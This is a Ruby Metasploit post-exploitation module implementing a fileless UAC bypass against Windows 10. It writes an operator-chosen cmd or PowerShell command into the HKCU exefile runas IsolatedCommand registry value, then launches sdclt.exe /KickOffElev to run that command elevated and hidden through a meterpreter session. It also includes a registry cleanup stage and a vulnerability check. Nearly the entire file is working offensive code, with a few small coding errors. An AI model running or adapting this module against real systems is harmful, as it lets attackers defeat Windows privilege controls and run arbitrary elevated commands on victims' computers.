require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'




# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = GreatRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry




# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'enigma fileless uac bypass [sdclt.exe]',
                        'Description'   => %q{
                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe or powershell.exe This module will create the required registry entry in the current user’s hive, set the reg_sz value to whatever you pass via the EXEC_COMMAND parameter, and runs sdclt.exe (hijacking the process being started to gain code execution).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln discover: enigma0x3 | mattifestation',  # vulnerability credits
                                ],
 
                        'Version'        => '$Revision: 1.5',
                        'DisclosureDate' => 'mar 18 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',     # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         [ 'Windows 10' ] # Only works againts Windows 10
                                ],
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',  # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('EXEC_COMMAND', [ false, 'The command to be executed (eg start notepad.exe)']),
                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability details/status?' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell -Command to execute our command?' , false]),
                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry hive/keys?' , false])
                        ], self.class) 

        end




# ----------------------------------------------
# GAIN REMOTE CODE EXCUTION BY HIJACKING PROCESS
# ----------------------------------------------
def ls_stage1

session = client
# arch = client.fs.file.expand_path("%ComSpec%")
arch_check = client.fs.file.expand_path("%Windir%\\SysWOW64")
if arch_check == "C:\\Windows\\SysWOW64"
  arch = "SysWOW64"
else
  arch = "System32"
end

  r=''
  vul_serve = "sdclt.exe" # vulnerable soft to be hijacked
  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell)
  uac_level = "ConsentPromptBehaviorAdmin" # uac level registry key
  vul_value = "IsolatedCommand" # vulnerable registry value to create
  comm_path = "%SystemRoot%\\#{arch}\\cmd.exe /c" # cmd.exe %comspec% path
  regi_hive = "REG ADD HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
  psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -Command" # use_powershell advanced option command
  uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  if datastore['EXEC_COMMAND'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set EXEC_COMMAND option!")
    return nil
  else
    print_status("Hijacking #{vul_serve} process!")
    Rex::sleep(1.5)
  end

    # search in target regedit if binary calls runas
    print_warning("Reading process registry hive keys ..")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Classes")
      print_good(" exec => remote registry hive key found!")
      Rex::sleep(1.0)
    else
      # registry hive key not found, aborting module execution.
      print_warning("Hive key: HKCU\\Software\\Classes\\exefile (runas call)")
      print_error("[ABORT]: module cant find the registry hive key needed ..")
      print_error("System does not appear to be vulnerable to the exploit code!")
      print_line("")
      Rex::sleep(1.0)
      return nil
    end

      # check target UAC settings (always notify - will abort module execution)
      check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
      # a dword:2 value it means 'always notify' setting is active.
      if check_success == 2
        print_warning("Target UAC set to: #{check_success} (always notify)")
        print_error("[ABORT]: module can not work under this condictions ..")
        print_error("Remote system its not vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      # a dword:nil value it means that we are running againts a 'non-uac-system'
      elsif check_success.nil?
        print_warning("UAC DWORD DATA EMPTY (NON-UAC-SYSTEM?)")
        print_error("[ABORT]: module can not work under this condictions ..")
        print_error("Remote system its not vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      else
        # all good in UAC settings :D
        print_good(" exec => Target UAC set to: #{check_success} (exploitable)")
        Rex::sleep(1.0)
      end

        #
        # chose to execute a single command in cmd.exe syntax
        # or to execute command using powershell.exe syntax
        #
        if datastore['USE_POWERSHELL'] == true
          comm_inje = "#{regi_hive} /v #{vul_value} /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
          print_good(" exec => Creating registry powershell command data")
          print_good("   data: #{psh_comma} #{exec_comm}")
          Rex::sleep(1.0)
        else
          comm_inje = "#{regi_hive} /v #{vul_value} /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
          print_good(" exec => Creating registry cmd command data")
          print_good("   data: #{comm_path} #{exec_comm}")
          Rex::sleep(1.0)
        end

 # Execute process hijacking in registry (cmd.exe OR powershell.exe) ..
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v IsolatedCommand /t REG_SZ /d "powershell.exe -Command start notepad.exe" /f
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v IsolatedCommand /t REG_SZ /d "cmd.exe /c start notepad.exe" /f
 print_good(" exec => Hijacking process to gain code execution ..")
 r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit 'enigma0x3' :D
 Rex::sleep(4.0)

      # start remote service to gain code execution
      print_good(" exec => Starting #{vul_serve} native process ..")
      r = session.sys.process.execute("cmd.exe /c start #{vul_serve} /KickOffElev", nil, {'Hidden' => true, 'Channelized' => true})
      Rex::sleep(1.0)

    # close channel when done
    print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ----------------------------------------------------
# DELETE MALICIOUS REGISTRY ENTRY (process hijacking)
# ----------------------------------------------------
def ls_stage2

  r=''
  session = client
  vul_serve = "sdclt.exe" # vulnerable soft to be hijacked
  vul_value = "IsolatedCommand" # vulnerable reg value to create
  chec_hive = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
  reg_clean = "REG DELETE HKCU\\Software\\Classes\\exefile /f" # registry hive to be clean
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  if datastore['DEL_REGKEY'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set DEL_REGKEY option!")
    return nil
  else
    print_status("Revert #{vul_serve} process hijack!")
    Rex::sleep(1.5)
  end

    # search in target regedit if hijacking method allready exists
    print_warning("Reading process registry hive keys ..")
    Rex::sleep(1.0)
    if registry_getvaldata("#{chec_hive}","#{vul_value}")
      print_good(" exec => Remote registry hive key found!")
      Rex::sleep(1.0)
    else
       # registry hive key not found, aborting module execution.
       print_warning("Hive key: HKCU\\Software\\Classes\\exefile\\shell\\runas\\command IsolatedCommand")
       print_error("[ABORT]: module cant find the registry hive key needed ..")
       print_line("")
       Rex::sleep(1.0)
       return nil
    end

 # Delete hijacking hive keys from target regedit ..
 # REG DELETE HKCU\Software\Classes\exefile /f
 print_good(" exec => Deleting HKCU hive registry keys ..")
 print_good(" exec => cmd.exe /c #{reg_clean}")
 r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit
 Rex::sleep(3.0)

      # check if remote registry hijack key was deleted successefuly
      if registry_getvaldata("#{chec_hive}","#{vul_value}")
        print_warning("Module can not verify if deletion has successefully!")
      else
        print_status("Registry hive keys deleted successefuly!")
      end

    Rex::sleep(1.0)
    # close channel when done
    print_status("process hijack reverted to default stage!")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# -------------------------------------------
# CHECK TARGET VULNERABILITY STATUS/EXISTANCE
# -------------------------------------------
def ls_stage3

  r=''
  session = client
  oscheck = client.fs.file.expand_path("%OS%")
  vuln_soft = "sdclt.exe" # vulnerable soft to be hijacked
  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
  vul_value = "IsolatedCommand" # vulnerable reg value to create
  vuln_key = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # vuln hijack key
  uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  if datastore['CHECK_VULN'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set CHECK_VULN option!")
    return nil
  else
    print_status("Checking target vulnerability details!")
    Rex::sleep(1.5)
  end

    print_warning("Reading process registry hive keys ..")
    Rex::sleep(2.0)
    # check target registry hive/key settings (hijacking hive/key)
    if registry_getvaldata("#{vuln_key}","#{vul_value}")
      vuln_stats = "#{vuln_key}"
      report_tw = "UAC BYPASS ACTIVE (runas)"
    elsif registry_enumkeys("HKCU\\Software\\Classes")
      vul_value = "NOT FOUND"
      vuln_stats = "HKCU\\Software\\Classes"
      report_tw = "VULNERABLE (hive found)"
    else
      vul_value = "NOT FOUND"
      vuln_stats = "HKCU\\Software\\Classes"
      report_tw = "NOT VULNERABLE (hive not found)"
    end

    # check target registry hive/key settings (UAC level settings)
    check_uac = registry_getvaldata("#{uac_hivek}","#{uac_level}")
    # a dword:2 value it means 'always notify' setting is active.
    if check_uac == 2
      report_level = "ALWAYS NOTIFY (NOT EXPLOITABLE)"
    # a dword:nil value it means that we are running againts a 'non-uac-system'
    elsif check_uac.nil?
      report_level = "DWORD DATA EMPTY (NON-UAC-SYSTEM?)"
    else
      # all good in UAC settings :D
      report_level = "#{check_uac} (EXPLOITABLE)"
    end

      # obsolect 'def run' allready checks for OS compatiblity.
      if oscheck.nil?
        oscheck = "NOT COMPATIBLE SYSTEM"
      end

    print_line("")
    # display target registry settings to user ..
    # i hope you are smart enouth to recognise a vulnerable output :D
    print_line("VULNERABLE_SOFT : #{vuln_soft}")
    print_line("    TARGET_OS   : #{oscheck}")
    print_line("    UAC_LEVEL   : #{report_level}")
    print_line("")
    print_line("    HIJACK_KEY  : #{vul_value}")
    print_line("    HIJACK_HIVE : #{vuln_stats}")
    print_line("    VULN_STATUS : #{report_tw}")
    print_line("")
    print_line("")
    Rex::sleep(1.0)
end




# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    | enigma fileless UAC bypass 'IsolatedCommand' |")
    print_line("    |            Author : r00t-3xp10it             |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    # check for proper operative system (windows 10)
    if not sysinfo['OS'] =~ /Windows 10/
      print_error("[ ABORT ]: This module only works againt windows 10 systems")
      return nil
    end
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals
    # that we are not on a meterpreter session!
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works in meterpreter sessions!")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['EXEC_COMMAND']
         ls_stage1
      end

      if datastore['DEL_REGKEY']
         ls_stage2
      end

      if datastore['CHECK_VULN']
         ls_stage3
      end
   end
end
